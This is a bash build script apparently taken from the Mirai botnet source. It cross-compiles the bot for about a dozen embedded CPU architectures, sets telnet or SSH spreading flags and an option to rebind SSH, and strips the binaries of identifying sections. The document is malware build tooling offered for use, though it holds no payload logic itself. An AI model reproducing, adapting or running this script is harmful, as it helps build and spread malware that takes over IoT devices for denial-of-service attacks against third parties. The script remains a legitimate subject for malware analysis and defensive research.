#!/bin/bash

FLAGS=""

function compile_bot {
    COMPILER=""
    case "$1" in
        "i586") COMPILER="gcc" ;;
        "mips") COMPILER="mips-linux-gnu-gcc" ;;
        "mipsel") COMPILER="mipsel-linux-gnu-gcc" ;;
        "armv4l") COMPILER="arm-linux-gnueabi-gcc" ;;
        "armv5l") COMPILER="arm-linux-gnueabi-gcc" ;;
        "armv6l") COMPILER="arm-linux-gnueabi-gcc" ;;
        "powerpc") COMPILER="powerpc-linux-gnu-gcc" ;;
        "sparc") COMPILER="sparc-linux-gnu-gcc" ;;
        "m68k") COMPILER="m68k-linux-gnu-gcc" ;;
        "sh4") COMPILER="sh4-linux-gnu-gcc" ;;
        *) COMPILER="$1-gcc" ;;
    esac

    STRIPPER=""
    case "$1" in
        "i586") STRIPPER="strip" ;;
        "mips") STRIPPER="mips-linux-gnu-strip" ;;
        "mipsel") STRIPPER="mipsel-linux-gnu-strip" ;;
        "armv4l") STRIPPER="arm-linux-gnueabi-strip" ;;
        "armv5l") STRIPPER="arm-linux-gnueabi-strip" ;;
        "armv6l") STRIPPER="arm-linux-gnueabi-strip" ;;
        "powerpc") STRIPPER="powerpc-linux-gnu-strip" ;;
        "sparc") STRIPPER="sparc-linux-gnu-strip" ;;
        "m68k") STRIPPER="m68k-linux-gnu-strip" ;;
        "sh4") STRIPPER="sh4-linux-gnu-strip" ;;
        *) STRIPPER="$1-strip" ;;
    esac

    $COMPILER -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    $STRIPPER release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

if [ $# == 2 ]; then
    if [ "$2" == "telnet" ]; then
        FLAGS="-DMIRAI_TELNET"
    elif [ "$2" == "ssh" ]; then
        FLAGS="-DMIRAI_SSH"
    fi
else
    echo "Missing build type." 
    echo "Usage: $0 <debug | release> <telnet | ssh>"
fi

if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release> <telnet | ssh>"
elif [ "$1" == "release" ]; then
    rm release/mirai.* 2>/dev/null
    rm release/miraint.* 2>/dev/null
    
    mkdir -p release
    
    compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static"

    compile_bot i586 miraint.x86 "-static"
    compile_bot mips miraint.mips "-static"
    compile_bot mipsel miraint.mpsl "-static"
    compile_bot armv4l miraint.arm "-static"
    compile_bot powerpc miraint.ppc "-static"
    compile_bot m68k miraint.m68k "-static"
    compile_bot sh4 miraint.sh4 "-static"

elif [ "$1" == "debug" ]; then
    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
else
    echo "Unknown parameter $1: $0 <debug | release>"
fi
